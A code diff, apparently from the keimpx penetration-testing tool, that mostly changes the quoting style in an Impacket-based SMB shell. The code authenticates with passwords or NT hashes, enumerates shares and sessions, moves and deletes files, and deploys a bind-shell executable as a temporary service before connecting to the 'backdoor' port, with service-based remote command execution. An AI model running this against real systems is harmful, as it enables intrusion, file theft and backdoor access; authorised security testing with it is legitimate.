@@ -38,14 +38,14 @@ try:
     from impacket.dcerpc.v5.dtypes import NULL
     from impacket.smbconnection import SMBConnection, SessionError
 except ImportError:
-    sys.stderr.write('smbshell: Impacket import error')
-    sys.stderr.write('Impacket by SecureAuth Corporation is required for this tool to work. Please download it using:'
-                     '\npip: pip install -r requirements.txt\nOr through your package manager:\npython-impacket.')
+    sys.stderr.write("smbshell: Impacket import error")
+    sys.stderr.write("Impacket by SecureAuth Corporation is required for this tool to work. Please download it using:"
+                     "\npip: pip install -r requirements.txt\nOr through your package manager:\npython-impacket.")
     sys.exit(255)
 
 
 #######################################################
-# Enhanced version of Impacket's smbclient.py example #
+# Enhanced version of Impacket"s smbclient.py example #
 #######################################################
 class SMBShell(Samr, SvcCtl):
     def __init__(self, target, credential, local_name):
@@ -60,28 +60,28 @@ class SMBShell(Samr, SvcCtl):
         self.__is_admin = credential.get_is_admin()
         self.__srcfile = local_name
 
-        self.__destfile = '*SMBSERVER' if self.__dstport == 139 else self.__dstip
+        self.__destfile = "*SMBSERVER" if self.__dstport == 139 else self.__dstip
         self.__timeout = 5 * 60
 
         self.smb = None
         self.tid = None
-        self.pwd = '\\'
-        self.share = ''
+        self.pwd = "\\"
+        self.share = ""
         self.shares_list = []
         self.domains_dict = {}
         self.users_list = set()
         self.completion = []
 
-        self.smbserver_share = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
+        self.smbserver_share = "".join(random.choice(string.ascii_uppercase) for _ in range(8))
 
         self.connect()
-        logger.debug('Connection to host %s established' % target.get_identity())
+        logger.debug("Connection to host %s established" % target.get_identity())
 
         self.login()
         logger.debug(
-            'Logged in as %s' % (self.__user if not self.__domain else '%s\%s' % (self.__domain, self.__user)))
+            "Logged in as %s" % (self.__user if not self.__domain else "%s\%s" % (self.__domain, self.__user)))
 
-        logger.info('Looking for a writable share, wait..')
+        logger.info("Looking for a writable share, wait..")
         _ = self.get_writable_share()
 
         self.info(False)
@@ -89,13 +89,13 @@ class SMBShell(Samr, SvcCtl):
         if _:
             DataStore.writable_share = _
         else:
-            logger.warn('Unable to find a writable share. Going to use %s, but some commands will not work'
+            logger.warn("Unable to find a writable share. Going to use %s, but some commands will not work"
                         % DataStore.writable_share)
 
             if DataStore.version_major >= 6 or (DataStore.version_major == 5 and DataStore.version_minor == 1):
-                DataStore.share_path = ntpath.join(DataStore.user_path, 'Windows', 'Temp')
+                DataStore.share_path = ntpath.join(DataStore.user_path, "Windows", "Temp")
             else:
-                DataStore.share_path = ntpath.join(DataStore.user_path, 'WINNT', 'Temp')
+                DataStore.share_path = ntpath.join(DataStore.user_path, "WINNT", "Temp")
 
     def connect(self):
         self.smb = SMBConnection(self.__destfile, self.__dstip, self.__srcfile, self.__dstport, self.__timeout)
@@ -104,10 +104,10 @@ class SMBShell(Samr, SvcCtl):
         try:
             self.smb.login(self.__user, self.__password, self.__domain, self.__lmhash, self.__nthash)
         except socket.error as e:
-            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
+            logger.warn("Connection to host %s failed (%s)" % (self.__dstip, e))
             raise RuntimeError
         except SessionError as e:
-            logger.error('SMB error: %s' % (e.getErrorString(),))
+            logger.error("SMB error: %s" % (e.getErrorString(),))
             raise RuntimeError
 
     def logoff(self):
@@ -120,14 +120,14 @@ class SMBShell(Samr, SvcCtl):
         try:
             self.trans.connect()
         except socket.error as e:
-            logger.warn('Connection to host %s failed (%s)' % (self.__dstip, e))
+            logger.warn("Connection to host %s failed (%s)" % (self.__dstip, e))
             raise RuntimeError
         except SessionError as e:
-            logger.warn('SMB error: %s' % e.getErrorString())
+            logger.warn("SMB error: %s" % e.getErrorString())
             raise RuntimeError
 
     def info(self, display=True):
-        self.smb_transport('srvsvc')
+        self.smb_transport("srvsvc")
         self.__dce = self.trans.get_dce_rpc()
         self.__dce.bind(srvs.MSRPC_UUID_SRVS)
 
@@ -135,7 +135,7 @@ class SMBShell(Samr, SvcCtl):
             self.__resp = srvs.hNetrServerGetInfo(self.__dce, 102)
         except rpcrt.DCERPCException as _:
             # traceback.print_exc()
-            logger.warning('Unable to query server information')
+            logger.warning("Unable to query server information")
             return None
 
         self.__dce.disconnect()
@@ -144,49 +144,49 @@ class SMBShell(Samr, SvcCtl):
         DataStore.server_name = self.smb.getServerName()
         DataStore.server_domain = self.smb.getServerDomain()
         DataStore.server_host = self.smb.getRemoteHost()
-        DataStore.user_path = self.__resp['InfoStruct']['ServerInfo102']['sv102_userpath']
-        DataStore.version_major = self.__resp['InfoStruct']['ServerInfo102']['sv102_version_major']
-        DataStore.version_minor = self.__resp['InfoStruct']['ServerInfo102']['sv102_version_minor']
+        DataStore.user_path = self.__resp["InfoStruct"]["ServerInfo102"]["sv102_userpath"]
+        DataStore.version_major = self.__resp["InfoStruct"]["ServerInfo102"]["sv102_version_major"]
+        DataStore.version_minor = self.__resp["InfoStruct"]["ServerInfo102"]["sv102_version_minor"]
 
         if display:
-            print('Operating system: %s' % self.smb.getServerOS())
-            print('Netbios name: %s' % self.smb.getServerName())
-            print('Domain: %s' % self.smb.getServerDomain())
-            print('SMB dialect: %s' % check_dialect(self.smb.getDialect()))
-            print('NTLMv2 support: %s' % self.smb.doesSupportNTLMv2())
-            print('UserPath: %s' % DataStore.user_path)
-            print('Simultaneous users: %d' % self.__resp['InfoStruct']['ServerInfo102']['sv102_users'])
-            print('Version major: %d' % DataStore.version_major)
-            print('Version minor: %d' % DataStore.version_minor)
-            print('Comment: %s' % self.__resp['InfoStruct']['ServerInfo102']['sv102_comment'] or '')
+            print("Operating system: %s" % self.smb.getServerOS())
+            print("Netbios name: %s" % self.smb.getServerName())
+            print("Domain: %s" % self.smb.getServerDomain())
+            print("SMB dialect: %s" % check_dialect(self.smb.getDialect()))
+            print("NTLMv2 support: %s" % self.smb.doesSupportNTLMv2())
+            print("UserPath: %s" % DataStore.user_path)
+            print("Simultaneous users: %d" % self.__resp["InfoStruct"]["ServerInfo102"]["sv102_users"])
+            print("Version major: %d" % DataStore.version_major)
+            print("Version minor: %d" % DataStore.version_minor)
+            print("Comment: %s" % self.__resp["InfoStruct"]["ServerInfo102"]["sv102_comment"] or "")
 
             # TODO: uncomment when SMBConnection will have a wrapper
             # getServerTime() method for both SMBv1,2,3
-            # print 'Time: %s' % self.smb.get_server_time()
+            # print "Time: %s" % self.smb.get_server_time()
 
         return self.__resp
 
     def who(self):
-        self.smb_transport('srvsvc')
+        self.smb_transport("srvsvc")
         self.__dce = self.trans.get_dce_rpc()
         self.__dce.connect()
         self.__dce.bind(srvs.MSRPC_UUID_SRVS)
         resp = srvs.hNetrSessionEnum(self.__dce, NULL, NULL, 502)
 
-        for session in resp['InfoStruct']['SessionInfo']['Level502']['Buffer']:
+        for session in resp["InfoStruct"]["SessionInfo"]["Level502"]["Buffer"]:
             print("Host: %15s, user: %5s, active: %5d, idle: %5d, type: %5s, transport: %s"
-                  % (session['sesi502_cname'][:-1], session['sesi502_username'][:-1], session['sesi502_time'],
-                     session['sesi502_idle_time'], session['sesi502_cltype_name'][:-1],
-                     session['sesi502_transport'][:-1]))
+                  % (session["sesi502_cname"][:-1], session["sesi502_username"][:-1], session["sesi502_time"],
+                     session["sesi502_idle_time"], session["sesi502_cltype_name"][:-1],
+                     session["sesi502_transport"][:-1]))
 
         self.__dce.disconnect()
 
     def __share_info(self, share):
-        self.smb_transport('srvsvc')
+        self.smb_transport("srvsvc")
         self.__dce = self.trans.get_dce_rpc()
         self.__dce.connect()
         self.__dce.bind(srvs.MSRPC_UUID_SRVS)
-        resp = srvs.hNetrShareGetInfo(self.__dce, '%s\x00' % share, 2)
+        resp = srvs.hNetrShareGetInfo(self.__dce, "%s\x00" % share, 2)
         self.__dce.disconnect()
 
         return resp
@@ -198,11 +198,11 @@ class SMBShell(Samr, SvcCtl):
         if share:
             self.use(share)
         elif not share and (self.share is None or self.tid is None):
-            logger.warn('Share has not been specified, select one')
+            logger.warn("Share has not been specified, select one")
             self.shares()
 
     def is_writable_share(self, share):
-        _ = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
+        _ = "".join([random.choice(string.ascii_letters) for _ in range(8)])
 
         try:
             self.use(share, False)
@@ -218,23 +218,23 @@ class SMBShell(Samr, SvcCtl):
     def get_writable_share(self):
         # Check we can write a directory on the shares, return the first writable one
         for _ in self.smb.listShares():
-            share = _['shi1_netname'][:-1]
+            share = _["shi1_netname"][:-1]
 
             try:
                 share_info = self.__share_info(share)
             except rpcrt.DCERPCException as _:
                 # traceback.print_exc()
-                logger.warning('Unable to query share: %s' % share)
+                logger.warning("Unable to query share: %s" % share)
                 continue
 
-            path = share_info['InfoStruct']['ShareInfo2']['shi2_path'][:-1]
+            path = share_info["InfoStruct"]["ShareInfo2"]["shi2_path"][:-1]
 
             if self.is_writable_share(share):
-                logger.info('Share %s %sis writable' % (share, "(%s) " % path if path else ""))
+                logger.info("Share %s %sis writable" % (share, "(%s) " % path if path else ""))
                 DataStore.share_path = path
                 return share
             else:
-                logger.debug('Share %s %sis not writable' % (share, "(%s) " % path if path else ""))
+                logger.debug("Share %s %sis not writable" % (share, "(%s) " % path if path else ""))
 
         return None
 
@@ -244,26 +244,26 @@ class SMBShell(Samr, SvcCtl):
 
         for i in range(len(shares)):
             count += 1
-            name = shares[i]['shi1_netname'][:-1]
+            name = shares[i]["shi1_netname"][:-1]
             self.shares_list.append(name)
 
-            comment = shares[i]['shi1_remark'][:-1]
-            share_type = shares[i]['shi1_type']
+            comment = shares[i]["shi1_remark"][:-1]
+            share_type = shares[i]["shi1_type"]
 
             _ = self.__share_info(name)
-            max_uses = _['InfoStruct']['ShareInfo2']['shi2_max_uses']  # 4294967295L is unlimited
-            current_uses = _['InfoStruct']['ShareInfo2']['shi2_current_uses']
-            permissions = _['InfoStruct']['ShareInfo2']['shi2_permissions']  # impacket always returns always 0
-            path = _['InfoStruct']['ShareInfo2']['shi2_path']
+            max_uses = _["InfoStruct"]["ShareInfo2"]["shi2_max_uses"]  # 4294967295L is unlimited
+            current_uses = _["InfoStruct"]["ShareInfo2"]["shi2_current_uses"]
+            permissions = _["InfoStruct"]["ShareInfo2"]["shi2_permissions"]  # impacket always returns always 0
+            path = _["InfoStruct"]["ShareInfo2"]["shi2_path"]
 
-            print('[%d] %s (comment: %s)' % (count, name, comment))
+            print("[%d] %s (comment: %s)" % (count, name, comment))
 
-            print('\tPath: %s' % path)
-            print('\tUses: %d (max: %s)' % (current_uses, 'unlimited' if max_uses == 4294967295 else max_uses))
-            # print '\tType: %s' % share_type
-            # print '\tPermissions: %d' % permissions
+            print("\tPath: %s" % path)
+            print("\tUses: %d (max: %s)" % (current_uses, "unlimited" if max_uses == 4294967295 else max_uses))
+            # print "\tType: %s" % share_type
+            # print "\tPermissions: %d" % permissions
 
-        msg = 'Which share do you want to connect to? (default: 1) '
+        msg = "Which share do you want to connect to? (default: 1) "
         limit = len(self.shares_list)
         choice = read_input(msg, limit)
 
@@ -271,25 +271,25 @@ class SMBShell(Samr, SvcCtl):
 
     def use(self, share, display=True):
         if not share:
-            raise missingShare('Share has not been specified')
+            raise missingShare("Share has not been specified")
 
         if self.tid:
             self.smb.disconnectTree(self.tid)
 
         try:
-            self.share = share.strip('\x00')
+            self.share = share.strip("\x00")
             self.tid = self.smb.connectTree(self.share)
-            self.pwd = '\\'
-            self.ls('', False)
+            self.pwd = "\\"
+            self.ls("", False)
         except SessionError as e:
             if not display:
                 pass
             elif e.getErrorCode() == nt_errors.STATUS_BAD_NETWORK_NAME:
-                logger.warn('Invalid share name')
+                logger.warn("Invalid share name")
             elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
-                logger.warn('Access denied')
+                logger.warn("Access denied")
             else:
-                logger.warn('Unable to connect to share: %s' % (e.getErrorString(),))
+                logger.warn("Unable to connect to share: %s" % (e.getErrorString(),))
 
     def cd(self, path):
         if not path:
@@ -299,33 +299,33 @@ class SMBShell(Samr, SvcCtl):
         path = ntpath.normpath(path)
         self.oldpwd = self.pwd
 
-        if path == '.':
+        if path == ".":
             return
-        elif path == '..':
-            sep = self.pwd.split('\\')
-            self.pwd = '\\'.join('%s' % s for s in sep[:-1])
+        elif path == "..":
+            sep = self.pwd.split("\\")
+            self.pwd = "\\".join("%s" % s for s in sep[:-1])
             return
 
-        if path[0] == '\\':
+        if path[0] == "\\":
             self.pwd = path
         else:
             self.pwd = ntpath.join(self.pwd, path)
 
-        # Let's try to open the directory to see if it's valid
+        # Let"s try to open the directory to see if it"s valid
         try:
             fid = self.smb.openFile(self.tid, self.pwd)
             self.smb.closeFile(self.tid, fid)
-            logger.warn('File is not a directory')
+            logger.warn("File is not a directory")
             self.pwd = self.oldpwd
         except SessionError as e:
             if e.getErrorCode() == nt_errors.STATUS_FILE_IS_A_DIRECTORY:
                 return
             elif e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
-                logger.warn('Access denied')
+                logger.warn("Access denied")
             elif e.getErrorCode() == nt_errors.STATUS_OBJECT_NAME_NOT_FOUND:
-                logger.warn('File not found')
+                logger.warn("File not found")
             else:
-                logger.warn('Unable to change directory: %s' % (e.getErrorString(),))
+                logger.warn("Unable to change directory: %s" % (e.getErrorString(),))
 
             self.pwd = self.oldpwd
 
@@ -336,7 +336,7 @@ class SMBShell(Samr, SvcCtl):
         self.check_share()
 
         if not path:
-            pwd = ntpath.join(self.pwd, '*')
+            pwd = ntpath.join(self.pwd, "*")
         else:
             pwd = ntpath.join(self.pwd, path)
 
@@ -349,16 +349,16 @@ class SMBShell(Samr, SvcCtl):
             if not display:
                 pass
             elif e.getErrorCode() in (nt_errors.STATUS_OBJECT_NAME_NOT_FOUND, nt_errors.STATUS_NO_SUCH_FILE):
-                logger.warn('File not found')
+                logger.warn("File not found")
             else:
-                logger.warn('Unable to list files: %s' % (e.getErrorString(),))
+                logger.warn("Unable to list files: %s" % (e.getErrorString(),))
 
             return
 
         for f in files:
             if display is True:
-                print('%s %8s %10d %s' % (time.ctime(float(f.get_mtime_epoch())),
-                                          '<DIR>' if f.is_directory() > 0 else '',
+                print("%s %8s %10d %s" % (time.ctime(float(f.get_mtime_epoch())),
+                                          "<DIR>" if f.is_directory() > 0 else "",
                                           f.get_filesize(), f.get_longname()))
 
             self.completion.append((f.get_longname(), f.is_directory(), f.get_filesize()))
@@ -368,26 +368,26 @@ class SMBShell(Samr, SvcCtl):
 
         if not path:
             path = ntpath.basename(self.pwd)
-            self.cd('..')
+            self.cd("..")
 
-        for x in range(0, path.count('\\')):
-            print('|  ')
+        for x in range(0, path.count("\\")):
+            print("|  ")
 
-        print('%s' % os.path.basename(path.replace('\\', '/')))
+        print("%s" % os.path.basename(path.replace("\\", "/")))
 
-        self.ls('%s\\*' % path, display=False)
+        self.ls("%s\\*" % path, display=False)
 
         for identified_file, is_directory, size in self.completion:
-            if identified_file in ('.', '..'):
+            if identified_file in (".", ".."):
                 continue
 
             if is_directory > 0:
                 self.lstree(ntpath.join(path, identified_file))
             else:
-                for x in range(0, path.count('\\')):
-                    print('|  ')
+                for x in range(0, path.count("\\")):
+                    print("|  ")
 
-                print('|-- %s (%d bytes)' % (identified_file, size))
+                print("|-- %s (%d bytes)" % (identified_file, size))
 
     def cat(self, filename):
         self.check_share()
@@ -400,17 +400,17 @@ class SMBShell(Samr, SvcCtl):
                 continue
 
             filepath = ntpath.join(self.pwd, identified_file)
-            logger.debug('Reading file %s (%d bytes)..' % (filepath, size))
+            logger.debug("Reading file %s (%d bytes).." % (filepath, size))
 
             try:
                 self.fid = self.smb.openFile(self.tid, filepath)
             except SessionError as e:
                 if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
-                    logger.warn('Access denied to %s' % identified_file)
+                    logger.warn("Access denied to %s" % identified_file)
                 elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
-                    logger.warn('Access denied to %s due to share access flags' % identified_file)
+                    logger.warn("Access denied to %s due to share access flags" % identified_file)
                 else:
-                    logger.error('Unable to access file: %s' % (e.getErrorString(),))
+                    logger.error("Unable to access file: %s" % (e.getErrorString(),))
 
                 continue
 
@@ -429,7 +429,7 @@ class SMBShell(Samr, SvcCtl):
                     if e.getErrorCode() == nt_errors.STATUS_END_OF_FILE:
                         break
                     else:
-                        logger.error('Unable to read file content: %s' % (e.getErrorString(),))
+                        logger.error("Unable to read file content: %s" % (e.getErrorString(),))
 
             self.smb.closeFile(self.tid, self.fid)
 
@@ -439,42 +439,42 @@ class SMBShell(Samr, SvcCtl):
         basename = os.path.basename(filename)
 
         if path is None:
-            path = '.'
+            path = "."
         else:
-            path = path.replace('\\', '/')
+            path = path.replace("\\", "/")
 
         self.ls(basename, display=False)
 
         for identified_file, is_directory, size in self.completion:
             if is_directory > 0:
                 self.downloadtree(identified_file)
-                self.cd('..')
+                self.cd("..")
                 continue
 
             filepath = ntpath.join(self.pwd, identified_file)
-            logger.debug('Downloading file %s (%d bytes)..' % (filepath, size))
+            logger.debug("Downloading file %s (%d bytes).." % (filepath, size))
 
             try:
-                fh = open(os.path.join(path, identified_file), 'wb')
+                fh = open(os.path.join(path, identified_file), "wb")
                 self.smb.getFile(self.share, filepath, fh.write)
                 fh.close()
             except SessionError as e:
                 if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
-                    logger.warn('Access denied to %s' % identified_file)
+                    logger.warn("Access denied to %s" % identified_file)
                 elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
-                    logger.warn('Access denied to %s due to share access flags' % identified_file)
+                    logger.warn("Access denied to %s due to share access flags" % identified_file)
                 else:
-                    logger.error('Unable to download file: %s' % (e.getErrorString(),))
+                    logger.error("Unable to download file: %s" % (e.getErrorString(),))
 
     def downloadtree(self, path):
         self.check_share()
 
         if not path:
             path = ntpath.basename(self.pwd)
-            self.cd('..')
+            self.cd("..")
 
         basename = ntpath.basename(path)
-        normpath = path.replace('\\', '/')
+        normpath = path.replace("\\", "/")
 
         self.cd(basename)
 
@@ -484,19 +484,19 @@ class SMBShell(Samr, SvcCtl):
             self.download(basename)
             return
 
-        logger.debug('Recreating directory %s' % self.pwd)
+        logger.debug("Recreating directory %s" % self.pwd)
         self.ls(None, display=False)
 
         if not os.path.exists(normpath):
             os.makedirs(normpath)
 
         for identified_file, is_directory, size in self.completion:
-            if identified_file in ('.', '..'):
+            if identified_file in (".", ".."):
                 continue
 
             if is_directory > 0:
                 self.downloadtree(ntpath.join(path, identified_file))
-                self.cd('..')
+                self.cd("..")
             else:
                 self.download(identified_file, normpath)
 
@@ -511,11 +511,11 @@ class SMBShell(Samr, SvcCtl):
         for filename in files:
             try:
                 if isinstance(filename, string_types):
-                    fp = open(filename, 'rb')
+                    fp = open(filename, "rb")
                 else:
                     fp = filename
             except IOError:
-                logger.error('Unable to open file %s' % filename)
+                logger.error("Unable to open file %s" % filename)
                 return False
 
             if not destfile or len(files) > 1:
@@ -524,18 +524,18 @@ class SMBShell(Samr, SvcCtl):
             destfile = ntpath.join(self.pwd, destfile)
 
             if isinstance(filename, string_types):
-                logger.debug('Uploading file %s to %s..' % (filename, destfile))
+                logger.debug("Uploading file %s to %s.." % (filename, destfile))
 
             try:
                 self.smb.putFile(self.share, destfile, fp.read)
             except SessionError as e:
                 traceback.print_exc()
                 if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
-                    logger.warn('Access denied to upload %s' % destfile)
+                    logger.warn("Access denied to upload %s" % destfile)
                 elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
-                    logger.warn('Access denied to upload %s due to share access flags' % destfile)
+                    logger.warn("Access denied to upload %s due to share access flags" % destfile)
                 else:
-                    logger.error('Unable to upload file: %s' % (e.getErrorString(),))
+                    logger.error("Unable to upload file: %s" % (e.getErrorString(),))
 
             fp.close()
 
@@ -561,17 +561,17 @@ class SMBShell(Samr, SvcCtl):
                 continue
 
             filepath = ntpath.join(self.pwd, identified_file)
-            logger.debug('Removing file %s (%d bytes)..' % (filepath, size))
+            logger.debug("Removing file %s (%d bytes).." % (filepath, size))
 
             try:
                 self.smb.deleteFile(self.share, filepath)
             except SessionError as e:
                 if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
-                    logger.warn('Access denied to %s' % identified_file)
+                    logger.warn("Access denied to %s" % identified_file)
                 elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
-                    logger.warn('Access denied to %s due to share access flags' % identified_file)
+                    logger.warn("Access denied to %s due to share access flags" % identified_file)
                 else:
-                    logger.error('Unable to remove file: %s' % (e.getErrorString(),))
+                    logger.error("Unable to remove file: %s" % (e.getErrorString(),))
 
     def rmdir(self, path):
         self.check_share()
@@ -584,29 +584,29 @@ class SMBShell(Samr, SvcCtl):
                 continue
 
             filepath = ntpath.join(self.pwd, identified_file)
-            logger.debug('Removing directory %s..' % filepath)
+            logger.debug("Removing directory %s.." % filepath)
 
             try:
                 self.smb.deleteDirectory(self.share, filepath)
             except SessionError as e:
                 if e.getErrorCode() == nt_errors.STATUS_ACCESS_DENIED:
-                    logger.warn('Access denied to %s' % identified_file)
+                    logger.warn("Access denied to %s" % identified_file)
                 elif e.getErrorCode() == nt_errors.STATUS_SHARING_VIOLATION:
-                    logger.warn('Access denied to %s due to share access flags' % identified_file)
+                    logger.warn("Access denied to %s due to share access flags" % identified_file)
                 else:
-                    logger.error('Unable to remove directory: %s' % (e.getErrorString(),))
+                    logger.error("Unable to remove directory: %s" % (e.getErrorString(),))
 
     def bindshell(self, port):
         connected = False
-        srvname = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
-        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
-        remote_file = '%s.exe' % ''.join([random.choice(string.ascii_lowercase) for _ in range(8)])
+        srvname = "".join([random.choice(string.ascii_letters) for _ in range(8)])
+        local_file = os.path.join(keimpx_path, "contrib", "srv_bindshell.exe")
+        remote_file = "%s.exe" % "".join([random.choice(string.ascii_lowercase) for _ in range(8)])
 
         if not os.path.exists(local_file):
-            raise missingFile('srv_bindshell.exe not found in the contrib subfolder')
+            raise missingFile("srv_bindshell.exe not found in the contrib subfolder")
 
-        logger.info('Launching interactive OS shell')
-        logger.debug('Going to use temporary service %s' % srvname)
+        logger.info("Launching interactive OS shell")
+        logger.debug("Going to use temporary service %s" % srvname)
 
         if not port:
             port = 4445
@@ -615,13 +615,13 @@ class SMBShell(Samr, SvcCtl):
 
         self.deploy(srvname, local_file, port, remote_file)
 
-        logger.info('Connecting to backdoor on port %d, wait..' % port)
+        logger.info("Connecting to backdoor on port %d, wait.." % port)
 
         for counter in range(0, 3):
             try:
                 time.sleep(1)
 
-                if str(sys.version.split()[0]) >= '2.6':
+                if str(sys.version.split()[0]) >= "2.6":
                     tn = Telnet(self.__dstip, port, 3)
                 else:
                     tn = Telnet(self.__dstip, port)
@@ -630,19 +630,19 @@ class SMBShell(Samr, SvcCtl):
                 tn.interact()
             except (socket.error, socket.herror, socket.gaierror, socket.timeout) as e:
                 if connected is False:
-                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (port, e)
+                    warn_msg = "Connection to backdoor on port %d failed (%s)" % (port, e)
 
                     if counter < 2:
-                        warn_msg += ', retrying..'
+                        warn_msg += ", retrying.."
                         logger.warn(warn_msg)
                     else:
                         logger.error(warn_msg)
             except SessionError as e:
                 # traceback.print_exc()
-                logger.error('SMB error: %s' % (e.getErrorString(),))
+                logger.error("SMB error: %s" % (e.getErrorString(),))
             except KeyboardInterrupt as _:
                 print()
-                logger.info('User aborted')
+                logger.info("User aborted")
             except Exception as e:
                 # traceback.print_exc()
                 logger.error(str(e))
@@ -684,8 +684,8 @@ class SMBShell(Samr, SvcCtl):
                         domain=self.__domain, lmhash=self.__lmhash, nthash=self.__nthash)
         return psexec
 
-    def svcshell(self, shell_mode='SHARE'):
-        if shell_mode == 'SERVER' and not is_local_admin():
+    def svcshell(self, shell_mode="SHARE"):
+        if shell_mode == "SERVER" and not is_local_admin():
             err = ("keimpx needs to be run as Administrator/root to use svcshell in SERVER mode. Privileged port is "
                    "needed to run SMB server.")
             raise missingPermission(err)
@@ -700,10 +700,10 @@ class SMBShell(Samr, SvcCtl):
 
         except SessionError as e:
             # traceback.print_exc()
-            logger.error('SMB error: %s' % (e.getErrorString(),))
+            logger.error("SMB error: %s" % (e.getErrorString(),))
         except KeyboardInterrupt as _:
             print()
-            logger.info('User aborted')
+            logger.info("User aborted")
         except Exception as e:
             # import traceback
             # traceback.print_exc()
@@ -711,8 +711,8 @@ class SMBShell(Samr, SvcCtl):
 
         sys.stdout.flush()
 
-    def svcexec(self, command, shell_mode='SHARE', display=True):
-        if shell_mode == 'SERVER' and not is_local_admin():
+    def svcexec(self, command, shell_mode="SHARE", display=True):
+        if shell_mode == "SERVER" and not is_local_admin():
             err = ("keimpx needs to be run as Administrator/root to use svcshell. "
                    "Privileged port is needed to run SMB server.")
             raise missingPermission(err)
@@ -736,10 +736,10 @@ class SMBShell(Samr, SvcCtl):
 
         except SessionError as e:
             # traceback.print_exc()
-            logger.error('SMB error: %s' % (e.getErrorString(),))
+            logger.error("SMB error: %s" % (e.getErrorString(),))
         except KeyboardInterrupt as _:
             print()
-            logger.info('User aborted')
+            logger.info("User aborted")
         except Exception as e:
             # traceback.print_exc()
             logger.error(str(e))
